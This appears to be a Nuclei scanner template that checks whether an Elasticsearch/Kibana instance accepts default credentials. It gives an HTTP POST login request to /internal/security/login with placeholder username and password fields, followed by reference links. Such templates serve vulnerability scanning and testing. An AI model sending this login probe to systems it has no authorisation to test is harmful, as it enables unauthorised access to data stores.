# Nuclei Template: ElasticSearch - Default Login
**Template ID:** elasticsearch-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`elasticsearch-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Elasticsearch default credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /internal/security/login HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows; Windows NT 10.1; Win64; x64; en-US) Gecko/20100101 Firefox/49.5
Referer: {{RootURL}}/login
Content-Type: application/json
kbn-version: 8.8.2
x-kbn-context: %7B%22name%22%3A%22security_login%22%2C%22url%22%3A%22%2Flogin%22%7D
Origin: {{RootURL}}

{"providerType":"basic","providerName":"basic","currentURL":"{{BaseURL}}/login","params":{"username":"{{username}}","password":"{{password}}" }}
```

## References
- https://www.alibabacloud.com/blog/what-is-the-default-username-and-password-for-elasticsearch_599610
- https://www.elastic.co/guide/en/elasticsearch/reference/current/built-in-users.html
